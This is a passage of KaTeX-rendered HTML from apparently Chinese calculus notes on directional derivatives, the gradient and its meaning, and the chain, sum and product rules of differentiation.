style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.399108em;vertical-align:-0.972108em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-2.055669em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">Δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16454285714285716em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2818857142857143em;"><span></span></span></span></span></span></span><span class="mrel mtight">→</span><span class="mord mtight">0</span></span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop">lim</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.941651em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">Δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord">Δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.972108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><ul><li>沿着方向<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mo>=</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">v=(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span>方向的导数为：</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="normal">∇</mi><mi>v</mi></msub><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mo>=</mo><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi mathvariant="normal">Δ</mi><mo>→</mo><mn>0</mn></mrow></munder><mfrac><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mi mathvariant="normal">Δ</mi><mo>⋅</mo><mi>a</mi><mo separator="true">,</mo><mi>y</mi><mo>+</mo><mi mathvariant="normal">Δ</mi><mo>⋅</mo><mi>b</mi><mo stretchy="false">)</mo><mo>−</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mi mathvariant="normal">Δ</mi></mfrac></mrow><annotation encoding="application/x-tex">\nabla_v{f(x,y)}= \lim_{\Delta\rightarrow 0}\frac{f(x+\Delta\cdot a,y+\Delta\cdot b)-f(x,y)}{\Delta}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">∇</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.171331em;vertical-align:-0.744331em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-2.055669em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">Δ</span><span class="mrel mtight">→</span><span class="mord mtight">0</span></span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop">lim</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.744331em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">Δ</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">Δ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">Δ</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><ul><li>偏导数就是沿着坐标轴方向的方向导数</li></ul><h4 id="梯度"><a class="markdownIt-Anchor" href="#梯度"></a> 梯度</h4><ul><li>对于一个可微函数f(x,y)，梯度的定义为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∇</mi><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi mathvariant="normal">∂</mi><mi>x</mi></msub><mi>f</mi><mo separator="true">,</mo><msub><mi mathvariant="normal">∂</mi><mi>y</mi></msub><mi>f</mi><msup><mo stretchy="false">)</mo><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">\nabla f(x,y)=(\partial_x{f},\partial_y{f})^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∇</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1274389999999999em;vertical-align:-0.286108em;"></span><span class="mopen">(</span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></li><li>代数意义：任意方向的偏导数可以由梯度表示，如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mo>=</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">v=(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span>，</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi mathvariant="normal">∇</mi><mi>v</mi></msub><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>v</mi><mo>⋅</mo><mi mathvariant="normal">∇</mi><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mo>=</mo><mi>a</mi><msub><mi mathvariant="normal">∂</mi><mi>x</mi></msub><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><mo>+</mo><mi>b</mi><msub><mi mathvariant="normal">∂</mi><mi>y</mi></msub><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">\nabla_v f(x,y)=v\cdot\nabla{f(x,y)}=a\partial_x{f(x,y)}+b\partial_y{f(x,y)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">∇</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∇</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.05556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathdefault">b</span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span></span></p><ul><li>几何意义：梯度方向就是函数增长最快的方向</li></ul><h3 id="函数求导"><a class="markdownIt-Anchor" href="#函数求导"></a> 函数求导</h3><h4 id="求导法则"><a class="markdownIt-Anchor" href="#求导法则"></a> 求导法则</h4><ul><li>链式法则(复合函数求导)：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mo stretchy="false">(</mo><mi>f</mi><mo>∘</mo><mi>g</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mi>f</mi><mo stretchy="false">(</mo><mi>g</mi><mo stretchy="false">)</mo><mo>⋅</mo><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mi>g</mi></mrow><annotation encoding="application/x-tex">\frac{d}{dx}(f \circ g)=\frac{d}{dx}f(g)\cdot \frac{d}{dx}g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∘</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span></li><li>加法法则：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mo stretchy="false">(</mo><mi>f</mi><mo>+</mo><mi>g</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mi>f</mi><mo>+</mo><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mi>g</mi></mrow><annotation encoding="application/x-tex">\frac{d}{dx}(f + g)=\frac{d}{dx}f + \frac{d}{dx}g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span></span></span></span></li><li>乘法法则：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mo stretchy="false">(</mo><mi>f</mi><mo>⋅</mo><mi>g</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mi>f</mi><mo>⋅</mo><mi>g</mi><mo>+</mo><mi>f</mi><mo>⋅</mo><mfrac><mi>d</mi><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mi>g</mi></mrow><annotation encoding="application/x-tex">\frac{d}{dx}(f \cdot  g)=\frac{d}{dx}f\cdot g +f\cdot  \frac{d}{dx}g</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span 